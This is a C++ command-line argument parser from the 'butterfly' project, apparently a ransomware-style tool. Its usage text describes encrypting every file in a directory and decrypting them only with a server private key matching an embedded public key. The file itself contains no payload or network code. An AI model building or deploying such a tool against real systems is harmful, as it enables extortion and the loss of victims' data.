
#include "argumentParser.h"

namespace butterfly
{

ArgumentParser::ArgumentParser(int argc, char *argv[]) : _argc(argc), _argv(argv)
{

    // Logger is disabled as default setting
    Logger::disable();

    // Save all arguments in vector
    for(int i = 1; i < _argc; i++)
    {
        _args.emplace_back(_argv[i]);
    }

}

ArgumentParser::Arguments ArgumentParser::parseArgs()
{

    Arguments args;

    if (_argc > 1)
    {
        bool found = false, decrypt = false, key = false;
        for (int i = 1; i < _argc; i++)
        {

            std::string arg = _argv[i];

            if (arg == "-h" || arg == "--help")
            {
                showUsage();
                exit(1);

            } else if (arg == "-v" || arg == "--version")
            {
                showVersion();
                exit(1);

            } else if (arg == "-p" || arg == "--protected")
            {
                found = true;
                args._protected = true;
            }
            else if (arg == "-c" || arg == "--config")
            {
                // check end of argc
                if (i + 1 < _argc && (!strchr(_argv[i + 1], '-')))
                {
                    found = true;
                    std::string configPath = _argv[i + 1];

                    // init logger instance
                    Logger::initFromConfig(configPath);

                } else
                {
                    std::cout << "--config option requires one argument!" << std::endl;
                    exit(1);
                }
            } else if (arg == "-d" || arg == "--dir")
            {
                // check end of argc
                if (i + 1 < _argc && (!strchr(_argv[i + 1], '-')))
                {
                    found = true;
                    args._dir = _argv[i + 1];

                } else
                {
                    std::cout << "--dir option requires one argument!" << std::endl;
                    exit(1);
                }

            } else if (arg == "-enc" || arg == "--encrypt")
            {
                // check end of argc
                if (i + 1 < _argc && (!strchr(_argv[i + 1], '-')))
                {
                    found = true;
                    args._encrypt = _argv[i + 1];

                } else
                {
                    std::cout << "--encrypt option requires one argument!" << std::endl;
                    exit(1);
                }

            } else if (arg == "-dec" || arg == "--decrypt")
            {
                // check end of argc
                if (i + 1 < _argc && (!strchr(_argv[i + 1], '-')))
                {
                    found = true, decrypt = true;
                    args._decrypt = _argv[i + 1];

                } else
                {
                    std::cout << "--decrypt option requires one argument!" << std::endl;
                    exit(1);
                }

            } else if (arg == "-k" || arg == "--key")
            {
                // check end of argc
                if (i + 1 < _argc && (!strchr(_argv[i + 1], '-')))
                {
                    found = true, key = true;
                    args._serverpKey = _argv[i + 1];

                } else
                {
                    std::cout << "--key option requires one argument!" << std::endl;
                    exit(1);
                }

            } else {

                if ( i + 1 < _argc && (!strchr(_argv[i + 1], '-')) )
                {
                    found = false;
                }

            }
        }
        if ( (!decrypt && key) or (decrypt && !key) )
        {
            std::cout << "Please use -dec/--decrypt and -k/--key options together!" << std::endl;
            exit(1);
        } else if (!found)
        {
            showUsage();
            exit(1);
        }
    } else
    {
        showUsage();
        exit(1);
    }

    return args;
}

void ArgumentParser::showUsage() const
{
    std::cout << "Usage: \n\t"
                        + std::string(PROJECT_NAME) + " --dir /home/testuser/butterfly/data/\n\t"
                        + std::string(PROJECT_NAME) + " --dir /home/testuser/butterfly/data/ --protected\n\t"
                        + std::string(PROJECT_NAME) + " --encrypt /home/testuser/butterfly/data/ \n\t"
                        + std::string(PROJECT_NAME) + " --decrypt /home/testuser/butterfly/data/ --key /home/testuser/butterfly/masterkeys/SPrivateRSA.pem\n\n"

               + "Options:\n"
                        + "\t-d,   --dir         Directory Path to start the Encryption+Decryption\n"
                        + "\t-enc, --encrypt\t    Encrypts all files in provided directory\n"
                        + "\t-dec, --decrypt\t    Decrypts all files in provided diretory\n"
                        + "\t-k,   --key         Private Key from the Server for the Decryption (Corresponds to the embedded Server Public Key)\n"
                        + "\t-p,   --protected   Save all key files to the System\n"
                        + "\t-c,   --config\t    Logger Config Path\n"
                        + "\t-v,   --version\t    Show version information and quit\n"
                        + "\t-h,   --help\t    Show this message and quit"

               + "\n\nbutterfly homepage at: https://github.com/bierschi/butterfly"
    << std::endl;
}

void ArgumentParser::showVersion() const
{
    std::cout    << PROJECT_NAME << " " << PROJECT_VER << std::endl
                 << "© 2021 by Bierschneider Christian (@bierschi)"
    << std::endl;
}

} // namespace butterfly